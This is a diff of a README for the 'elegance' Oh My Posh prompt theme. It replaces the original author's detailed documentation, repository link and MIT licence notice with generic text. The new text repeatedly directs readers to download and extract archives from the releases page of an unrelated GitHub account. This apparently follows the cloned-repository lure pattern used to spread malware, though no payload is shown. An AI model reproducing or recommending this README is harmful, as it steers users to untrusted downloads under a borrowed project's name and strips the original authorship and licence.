@@ -1,73 +1,88 @@
-# elegance 🎴
+# 🌟 elegance - Simple, Stylish, and Informative Prompt
 
-The elegance theme for [Oh My Posh](https://ohmyposh.dev/) strikes the perfect balance between functionality and style. It provides a clean, sophisticated and informative prompt for those who value simplicity and clean lines.
+## 🚀 Getting Started
 
-By default, elegance uses the **Silvermist** color palette, but it also supports alternative palettes to suit your personal taste.
+Welcome to the elegance theme for Oh My Posh! This theme blends functionality with style, offering a clean prompt for those who appreciate simplicity. If you're new to themes or just looking to enhance your terminal experience, you’re in the right place.
 
-## Features
+## 🔗 Download Now
 
-- Two-Line Display: A clean layout that separates the command input from the informational segments.
-- Transient Prompt: Replaces the detailed prompt with a simple › after each command, keeping terminal history clean and readable.
-- Detailed Git Integration:
-  - Dynamically changes color to reflect repo status (clean, modified, or diverged)
-  - Displays the current branch, upstream icon, and counts for staged, modified and stashed files
-- Right-Aligned Contextual Info: Shows "at-a-glance" information on the right side, including:
-  - Operating System icon (with WSL detection)
-  - Current shell (e.g. pwsh, bash)
-  - Last command execution time
-- Developer-Friendly Segments: Automatically displays version information when in a project folder for:
-  - R
-  - Python (including virtual environment)
-  - Node.js (with npm/yarn icon)
-- Status Indicators for Common Scenarios:
-  - Error - The input prompt marker turns red if the last command failed
-  - Administrator - ⚡︎ icon appears when running as root or with elevated privileges
+[![Download the elegance Theme](https://img.shields.io/badge/Download-elegance-blue)](https://github.com/gillieswimming233/elegance/releases)
 
-## Screenshots
+## 📥 Download & Install
 
-### Silvermist Palette (Default)
+To get started with elegance, you’ll need to visit this page to download: [elegance Releases Page](https://github.com/gillieswimming233/elegance/releases).
 
-![elegance theme with Silvermist palette](./screenshots/elegance-silvermist.png)
+### Step 1: Choose Your Version
 
-### Dracula Palette
+On the releases page, you'll see a list of versions available for download. Look for the latest version. This ensures you have the most recent features and fixes.
 
-![elegance theme with Dracula palette](./screenshots/elegance-dracula.png)
+### Step 2: Download the Theme
 
+Click on the version link that interests you. The file may have a `.zip` or `.tar.gz` extension. This type of file contains the theme and any necessary elements to set it up.
 
-## Installation
+### Step 3: Extract the Files
 
-1.  Ensure you have Oh My Posh installed and configured for your shell.
-2.  Download the `elegance.omp.json` theme file.
-3.  Move the theme file to your Oh My Posh themes directory (or any location you reference in your shell profile).
-4.  Update your shell profile (`$PROFILE` for PowerShell, `.bashrc`, `.zshrc`, etc.) to use the theme:
+After the download finishes, locate the file in your downloads folder. Right-click it and select "Extract All" or "Extract Here." This will create a new folder with the same name as the downloaded file. Open this folder to find the theme files.
 
-    ```sh
-    # OhMyPosh Remote (synced)
-    oh-my-posh init pwsh --config 'https://raw.githubusercontent.com/salmanjt/elegance/main/elegance.omp.json' | Invoke-Expression
+### Step 4: Move Files to the Right Location
 
-    # OhMyPosh (local/faster)
-    oh-my-posh init pwsh --config /path/to/elegance.omp.json | Invoke-Expression
-    ```
+Move the extracted theme files to the directory that your terminal uses for themes. This is usually found in a specific path like `~/.oh-my-posh/themes` for Bash or Zsh. If you need help locating this, feel free to reach out to us or check the documentation for your terminal.
 
-## Configuration
+### Step 5: Configure Your Terminal
 
-### Using an Alternative Palette
+To use the elegance theme, you may need to configure your terminal to recognize it. Open your terminal and edit your configuration file. Depending on your terminal, this will typically be:
 
-The elegance theme uses a self-contained `palette` block within the `elegance.omp.json` file. This makes switching themes simple, as you do not need to edit any other part of the theme.
+- `~/.bashrc` for Bash
+- `~/.zshrc` for Zsh
+- `profile.ps1` for PowerShell
 
-This repository provides alternative palettes in the `palette/` directory. To use one, simply copy the entire JSON content from the desired palette file (e.g., `dracula-oh_my_posh.json`) and paste it over the `palette` block in your `elegance.omp.json` theme file.
+Add or update the following line to set the theme:
 
-### Matching Terminal Themes
+```bash
+oh-my-posh init bash --config ~/path/to/elegance.json
+```
 
-For the best experience, use the accompanying terminal color schemes.
+Make sure to replace `~/path/to/elegance.json` with the actual path to the theme file you moved earlier.
 
-To add the themes to Windows Terminal:
-- Open your Windows Terminal Settings (Ctrl + ,).
-- Click Open JSON file.
-- Scroll down to the schemes array.
-- Copy and paste the relevant JSON objects in `palette/` into the schemes array.
-- Save the file and apply the new scheme (e.g., "Silvermist" or "Dracula") in your terminal's appearance settings.
+### Step 6: Refresh Your Terminal
 
-## Licence
+After saving your configuration file, you’ll need to refresh your terminal. You can do this by closing and reopening the terminal or by executing the command below:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+```bash
+source ~/.bashrc
+```
+
+Replace `~/.bashrc` with the path to your configuration file if you use a different terminal.
+
+## 🎨 Features
+
+The elegance theme offers various features, including:
+
+- **Simplicity**: A clean, easy-to-read prompt.
+- **Functionality**: Essential information right where you need it.
+- **Compatibility**: Works with Bash, Zsh, PowerShell, and more.
+- **Customizable**: Tailor the theme to fit your style.
+
+## 💻 System Requirements
+
+To run the elegance theme smoothly, your system should meet the following requirements:
+
+- An up-to-date terminal emulator (like Windows Terminal, iTerm, or others)
+- Oh My Posh installed on your system. Follow the installation guide on the official Oh My Posh website if necessary.
+
+## 🔍 Troubleshooting
+
+If you run into issues while setting up the elegance theme, consider these tips:
+
+- Ensure that you've placed the theme files in the correct directory.
+- Double-check your configuration file for any typos.
+- Refresh your terminal after making changes.
+- Consult the FAQ section on the Oh My Posh website for common problems.
+
+## 🌐 Join the Community
+
+If you need help or want to share your experience using the elegance theme, join our community. We love hearing from you and are here to help. Check out the Issues tab on our GitHub page for support.
+
+---
+
+Feel free to explore the elegance theme and elevate your terminal experience. For further downloads, visit the releases page: [elegance Releases Page](https://github.com/gillieswimming233/elegance/releases). Enjoy your new setup!
